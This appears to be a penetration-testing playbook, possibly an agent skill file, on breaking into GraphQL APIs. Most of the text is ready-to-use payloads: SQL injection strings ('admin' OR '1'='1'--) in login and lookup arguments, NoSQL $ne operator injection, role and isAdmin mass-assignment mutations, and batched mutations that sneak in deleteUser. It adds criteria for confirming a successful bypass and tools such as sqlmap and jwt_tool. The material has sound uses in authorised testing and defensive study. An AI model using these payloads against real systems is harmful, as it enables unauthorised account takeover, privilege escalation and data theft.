# GraphQL Auth Bypass + SQL/NoSQL Injection

## When this applies

- Login mutation accepts `username`/`password` and routes to the same backend SQL/NoSQL query as the REST login.
- Resolver passes arguments straight into a raw query (`SELECT ... WHERE username='${args.username}'`).
- JWT issuance / refresh flows are reachable via mutation.

## Technique

Test the login mutation with classic SQLi payloads (`admin' OR '1'='1'--`), NoSQL operators (`{"$ne": null}`), and JWT manipulation. Authentication-related GraphQL endpoints are typically thinner than REST — fewer middleware layers.

## Steps

### Direct admin login

```graphql
mutation {
  login(input: {username: "admin", password: "admin"}) {
    token
    success
    user {
      id
      role
      permissions
    }
  }
}
```

### SQL injection in GraphQL

```graphql
mutation {
  login(input: {username: "admin' OR '1'='1'--", password: "anything"}) {
    token
  }
}
```

```graphql
query {
  getUser(id: "1' OR '1'='1'--") {
    username
  }
}
```

### NoSQL injection

```graphql
mutation {
  login(input: {username: {"$ne": null}, password: {"$ne": null}}) {
    token
  }
}
```

### JWT token manipulation

```graphql
mutation {
  login(input: {username: "user", password: "pass"}) {
    token  # Manipulate this JWT
  }
}
```

### Authorization bypass — privilege escalation

```graphql
# Try accessing admin resources with regular user token
query {
  adminPanel {
    users {
      username
      password
    }
  }
}

# Modify role in mutation
mutation {
  updateUser(id: 2, input: {role: "admin"}) {
    id
    role
  }
}
```

### Parameter tampering — extra fields

```graphql
# Add unauthorized fields
mutation {
  updateUser(id: 2, input: {
    username: "user2",
    role: "admin",           # Try adding
    isAdmin: true,           # Try adding
    permissions: ["*"]       # Try adding
  }) {
    role
  }
}
```

### Object injection

```graphql
# Include unexpected fields
mutation {
  createPost(input: {
    title: "Post",
    content: "Content",
    authorId: 1,              # Try manipulating
    isPublished: true,        # Try adding
    isFeatured: true          # Try adding
  }) {
    id
  }
}
```

### Batch operations — sneak in unauthorized actions

```graphql
mutation {
  action1: updateMyProfile(input: {bio: "..."}) { success }
  action2: deleteUser(id: 5) { success }  # Sneak in
  action3: updateMyEmail(email: "...") { success }
}
```

## Verifying success

- Login returns a token despite invalid password (SQLi succeeded).
- Returned token has an admin/superuser role claim (decode JWT).
- Privilege-escalation mutation persists (re-fetch user, see new role).

## Common pitfalls

- GraphQL libraries may auto-coerce types — `username: {"$ne": null}` may fail typed schemas (NoSQL injection works only when args are scalar `String`).
- Some apps use prepared statements at the resolver level — SQLi only succeeds in the rare case of string concatenation.
- JWT secrets may be retrievable via separate info-disclosure (env files, source) — combine with `skills/web-app-logic/reference/scenarios/info-disclosure/`.

## Tools

- Burp Suite Repeater
- jwt_tool, jwt.io
- sqlmap (with custom JSON tamper)
- NoSQLMap
